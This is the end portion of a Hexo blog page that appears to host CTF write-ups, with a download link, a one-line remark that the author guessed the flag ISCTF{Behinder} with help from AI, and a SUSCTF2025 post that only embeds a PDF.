<p>附件下载： <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qQ1l-JncSGlDQdNqv3XjRw?pwd=gzei">https://pan.baidu.com/s/1qQ1l-JncSGlDQdNqv3XjRw?pwd=gzei</a></p>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qQ1l-JncSGlDQdNqv3XjRw?pwd=gzei">https://pan.baidu.com/s/1qQ1l-JncSGlDQdNqv3XjRw?pwd=gzei</a></p>
</blockquote>
</li>
</ul>
<p>喂ai盲猜ISCTF{Behinder}，侥幸二血</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/22/SUSCTF2025/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/headimage.jpg">
      <meta itemprop="name" content="Rekjo">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Hexo">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/22/SUSCTF2025/" class="post-title-link" itemprop="url">SUSCTF2025</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-12-22 23:37:09" itemprop="dateCreated datePublished" datetime="2025-12-22T23:37:09+08:00">2025-12-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-12-23 00:01:37" itemprop="dateModified" datetime="2025-12-23T00:01:37+08:00">2025-12-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <embed src="/pdf/SUSCTF2025.pdf" width="100%" height="600px" />

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder"><span id="copyright"> Welcome. All rights reserved. Non-commercial use allowed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a>.</span></span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div><div>
<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        // 关键修复：将日期格式改为 ISO 8601 (年-月-日)
        var grt = new Date("2025-12-22 00:00:00");
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
    setInterval("createtime()",250);
</script>
</div>


    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
